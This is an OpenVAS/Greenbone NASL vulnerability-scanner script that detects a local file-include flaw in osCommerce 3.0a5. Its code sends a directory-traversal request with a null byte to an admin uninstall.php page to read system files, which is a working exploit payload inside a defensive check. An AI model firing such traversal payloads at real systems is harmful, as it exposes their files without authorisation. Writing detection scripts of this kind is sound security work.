# Copyright (C) 2010 Greenbone Networks GmbH
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-or-later
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.

CPE = "cpe:/a:oscommerce:oscommerce";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.100616");
  script_version("2021-07-20T10:07:38+0000");
  script_tag(name:"last_modification", value:"2021-07-20 10:07:38 +0000 (Tue, 20 Jul 2021)");
  script_tag(name:"creation_date", value:"2010-05-04 12:32:13 +0200 (Tue, 04 May 2010)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");

  script_tag(name:"qod_type", value:"remote_vul");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_name("osCommerce Local File Include and HTML Injection Vulnerabilities");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2010 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_oscommerce_http_detect.nasl", "os_detection.nasl");
  script_mandatory_keys("oscommerce/http/detected");
  script_require_ports("Services/www", 443);

  script_tag(name:"summary", value:"osCommerce is prone to a local file-include vulnerability and an HTML-
  injection vulnerability because it fails to properly sanitize user-supplied input.");

  script_tag(name:"impact", value:"An attacker can exploit the local file-include vulnerability using directory-
  traversal strings to execute local files within the context of the webserver process.

  The attacker may leverage the HTML-injection issue to execute arbitrary HTML and script code in the context
  of the affected browser. This may let the attacker steal cookie-based authentication credentials or control
  how the site is rendered to the user.");

  script_tag(name:"affected", value:"osCommerce 3.0a5 is affected. Other versions may also be vulnerable.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/39820");
  script_xref(name:"URL", value:"http://ictsec.wordpress.com/exploits/oscommerce-v3-0a5-multiple-vulnerabilities/");

  exit(0);
}

include("misc_func.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");
include("os_func.inc");

if( ! port = get_app_port( cpe:CPE, service:"www" ) )
  exit( 0 );

if( ! dir = get_app_location( cpe:CPE, port:port ) )
  exit( 0 );

if( dir == "/" )
  dir = "";

files = traversal_files();

foreach file( keys( files ) ) {
  url =  dir + "/admin/includes/applications/services/pages/uninstall.php?module=../../../../../../../../" +
         files[file] + "%00";

  if( http_vuln_check( port:port, url:url, pattern:file ) ) {
    report = http_report_vuln_url( port:port, url:url );
    security_message( port:port, data:report );
    exit( 0 );
  }
}

exit( 99 );
